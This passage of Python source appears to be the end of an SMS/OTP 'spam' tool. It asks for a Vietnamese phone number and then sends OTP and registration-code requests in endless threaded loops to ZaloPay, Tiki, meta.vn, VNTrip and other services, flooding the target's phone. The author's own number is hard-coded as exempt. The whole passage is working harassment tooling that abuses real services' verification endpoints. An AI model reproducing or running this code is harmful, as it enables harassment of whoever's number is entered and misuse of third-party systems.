            token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()['data']['send_otp_token']
            json_data = {
                'phone_number': self.phone,
                'send_otp_token': token,
            }

            response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data).text
            print(self.format_print("*",f"ZALOPAY: SUCCESS!"))
        except:
            print(self.format_print("*",f"ZALOPAY: ERROR!"))
    def tiki(self):
        try:
            json_data = {
                    'phone_number': self.phone,
                }
            response_tiki = requests.post('https://tiki.vn/api/v2/customers/otp_codes', headers=self.ua, json=json_data).text
            print(self.format_print("*",f"TIKI: SUCCESS!"))
        except:
            print(self.format_print("*",f"TIKI: ERROR!"))
    def meta_vn(self):
        try:
            params = {
                'api_mode': '1',
            }

            json_data = {
                'api_args': {
                    'lgUser': self.phone,
                    'act': 'send',
                    'type': 'phone',
                },
                'api_method': 'CheckExist',
            }

            response_meta_vn = requests.post('https://meta.vn/app_scripts/pages/AccountReact.aspx', params=params, headers=self.ua, json=json_data).text
            print(self.format_print("*",f"METAVN: SUCCESS!"))
        except:
            print(self.format_print("*",f"METAVN: ERROR!"))
    def vntrip(self):
        try:
            json_data = {
                'feature': 'register',
                'phone': '+84'+self.phone[1:11],
            }

            response_vntrip = requests.post('https://micro-services.vntrip.vn/core-user-service/verification/request/phone', headers=self.ua, json=json_data).text
            print(self.format_print("*",f"VNTRIP: SUCCESS!"))
        except:
            print(self.format_print("*",f"VNTRIP: ERROR!"))
    def run_sendotp(self):
        while True:
            self.send_otp()
            time.sleep(60)
    def run_sendcode(self):
        while True:
            for x in range(3):
                self.send_code()
                time.sleep(1)
            time.sleep(70)
    def run(self):
        while True:
            self.banner()
            self.phone = input(self.format_input("!",f"Nhập SĐT: "))
            if self.phone != '0865534267':
                if len(self.phone) == 10:
                    break
                print(self.format_print("!", "Sai Số Điện Thoại Vui Lòng Nhập Lại !"))
            if self.phone == '0865534267':
                print(self.format_print("!", "Bạn Không Được Spam Số Điện Thoại Của Tôi!"))
            time.sleep(3)
            
        
        threading.Thread(target=self.checkdvc).start()
        time.sleep(1)
        threading.Thread(target=self.run_sendotp).start()
        time.sleep(1)
        threading.Thread(target=self.run_sendcode).start()
        while True:
            self.Gbay()
            self.zalopay()
            self.moca()
            self.tiki()
            self.meta_vn()
            self.vntrip()
            time.sleep(1)
            
if __name__ == "__main__":
    try:
        SPAM().run()
    except KeyboardInterrupt:
        time.sleep(3)
        sys.exit('\n'+SPAM().format_print('*', 'Cảm Ơn Bạn Đã Sử Dụng'))
